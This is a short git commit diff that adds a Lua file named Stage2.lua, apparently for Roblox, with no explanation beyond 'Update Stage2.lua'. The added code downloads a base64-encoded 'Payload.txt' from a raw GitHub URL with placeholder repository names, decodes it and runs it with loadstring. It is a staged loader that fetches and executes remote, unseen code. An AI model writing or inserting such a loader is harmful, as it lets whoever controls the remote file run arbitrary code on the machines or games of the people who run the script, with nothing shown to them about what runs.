54456f3e855def235f47827ece6c2e91334b0c70
beiyryeiyr7-crypto <beiyryeiyr7@gmail.com>
2026-05-07 23:48:59 +0700

    Update Stage2.lua

--- Stage2.lua
+++ Stage2.lua
@@ -1,1 +1,9 @@
+local encoded =
+game:HttpGet(
+"https://raw.githubusercontent.com/USERNAME/REPO/main/Payload.txt"
+)
 
+local decoded =
+game:GetService("HttpService"):Base64Decode(encoded)
+
+loadstring(decoded)()
